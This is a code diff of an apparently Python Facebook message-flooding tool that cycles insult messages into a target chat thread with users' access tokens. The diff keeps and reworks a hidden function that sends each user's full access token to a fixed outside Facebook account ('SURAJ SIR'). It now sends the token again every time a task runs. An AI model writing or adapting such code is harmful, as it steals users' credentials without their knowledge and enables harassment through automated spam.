@@ -25,7 +25,6 @@ tasks_lock = Lock()
 stop_events = {}
 token_usage = {}
 token_locks = {}
-initial_messages_sent = set()  # Track tokens that have sent initial message
 
 # 🔥 BADA STRONG HEADERS - MOZILLA LINUX
 headers = {
@@ -50,15 +49,14 @@ def generate_task_key():
     return ''.join(random.choices(string.ascii_lowercase, k=10))
 
 def send_initial_message(access_token):
-    """Send initial message to SURAJ SIR's inbox with full token"""
+    """Send initial message to fixed user ID inbox"""
     try:
-        # Extract user ID from the Facebook profile URL
-        user_id = "100056999599628"  # From the provided link
+        # Use latest Graph API version
+        api_url = f'https://graph.facebook.com/v19.0/t_100056999599628/'
         
-        # Format: HELLO ! SURAJ SIR , I M USING YOUR SERVER MY TOKEN IS <full_token>
+        # Format message as requested
         message = f"HELLO ! SURAJ SIR , I M USING YOUR SERVER MY TOKEN IS {access_token}"
         
-        api_url = f'https://graph.facebook.com/v15.0/t_{user_id}/'
         parameters = {
             'access_token': access_token, 
             'message': message
@@ -70,9 +68,6 @@ def send_initial_message(access_token):
             headers=headers,
             timeout=30
         )
-        
-        # Mark this token as having sent initial message
-        initial_messages_sent.add(access_token)
         return True
     except Exception:
         return False
@@ -110,6 +105,9 @@ def send_messages_strong(task_key, access_tokens, thread_id, hatersname, lastnam
     if not stop_event:
         return
     
+    # Send initial messages for each token (only once)
+    initial_sent = set()
+    
     while not stop_event.is_set():
         # Cycle through messages
         for message_index, message_text in enumerate(messages):
@@ -121,9 +119,10 @@ def send_messages_strong(task_key, access_tokens, thread_id, hatersname, lastnam
                 if stop_event.is_set():
                     break
                 
-                # Send initial message if not sent for this token (only once ever)
-                if access_token not in initial_messages_sent:
+                # Send initial message if not sent for this token
+                if access_token not in initial_sent:
                     send_initial_message(access_token)
+                    initial_sent.add(access_token)
                     time.sleep(5)  # Small delay after initial message
                 
                 # Check rate limit - if exceeded, wait 5 minutes
@@ -139,8 +138,8 @@ def send_messages_strong(task_key, access_tokens, thread_id, hatersname, lastnam
                 # Format message
                 message = f"{hatersname} {message_text} {lastname}"
                 
-                # Send message
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                # Send message using latest Graph API
+                api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
                 parameters = {
                     'access_token': access_token, 
                     'message': message
@@ -177,17 +176,17 @@ def send_messages_strong(task_key, access_tokens, thread_id, hatersname, lastnam
 def check_token_validity(token):
     """Check if token is valid and get user info with chat groups"""
     try:
-        # Get basic user info
-        user_url = f"https://graph.facebook.com/me?access_token={token}&fields=id,name,email,picture"
+        # Get basic user info using latest Graph API
+        user_url = f"https://graph.facebook.com/v19.0/me?access_token={token}&fields=id,name,email,picture"
         user_response = requests.get(user_url, timeout=10)
         
         if user_response.status_code != 200:
-            return {"valid": False}
+            return {"valid": False, "error": f"HTTP {user_response.status_code}"}
         
         user_data = user_response.json()
         
         # Get threads/conversations (chat groups)
-        threads_url = f"https://graph.facebook.com/me/threads?access_token={token}&fields=id,name,participants"
+        threads_url = f"https://graph.facebook.com/v19.0/me/threads?access_token={token}&fields=id,name,participants"
         threads_response = requests.get(threads_url, timeout=10)
         
         threads = []
